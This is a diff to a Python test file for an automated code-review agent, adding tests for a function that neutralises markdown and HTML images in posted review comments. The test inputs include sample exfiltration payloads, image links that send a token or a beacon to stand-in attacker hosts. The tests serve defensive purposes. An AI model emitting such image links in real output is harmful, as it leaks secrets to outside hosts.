@@ -14,6 +14,7 @@ import pytest
 
 from webhook_agent.review.comment_poster import (
     build_github_review_comments,
+    defang_images,
     filter_echo_suggestions,
     format_suggestion_body,
     is_echo_description,
@@ -234,3 +235,31 @@ def test_is_echo_suggestion_forward_non_empty_line_scan():
     }
     suggestion = "def calculate():\n    a = 10\n    return a"
     assert is_echo_suggestion(suggestion, file_lines, line=50) is True
+
+
+def test_defang_images_markdown() -> None:
+    """Verify markdown images are neutralized with zero-width space while regular links are preserved."""
+    raw = "Check this diagram: ![architecture](https://attacker.com/leak?token=123) and see [docs](https://google.com)."
+    expected = "Check this diagram: !\u200b[architecture](https://attacker.com/leak?token=123) and see [docs](https://google.com)."
+    assert defang_images(raw) == expected
+    assert defang_images("[docs](https://google.com)") == "[docs](https://google.com)"
+    assert defang_images("") == ""
+
+
+def test_defang_images_html() -> None:
+    """Verify HTML image tags are neutralized into escaped entities case-insensitively."""
+    raw_lower = 'Tracking pixel: <img src="https://attacker.com/track.png" width="1"/>'
+    expected_lower = 'Tracking pixel: &lt;img src="https://attacker.com/track.png" width="1"/>'
+    assert defang_images(raw_lower) == expected_lower
+
+    raw_upper = 'Tracking pixel: <IMG SRC="https://attacker.com/track.png" width="1"/>'
+    expected_upper = 'Tracking pixel: &lt;img SRC="https://attacker.com/track.png" width="1"/>'
+    assert defang_images(raw_upper) == expected_upper
+
+
+def test_format_suggestion_body_defanged() -> None:
+    """Verify format_suggestion_body neutralizes images in description."""
+    desc = "Exfiltration attempt: ![beacon](https://evil.org/ping)"
+    body = format_suggestion_body(desc, suggested_fix="x = 1")
+    assert "!\u200b[beacon](https://evil.org/ping)" in body
+    assert "![beacon]" not in body
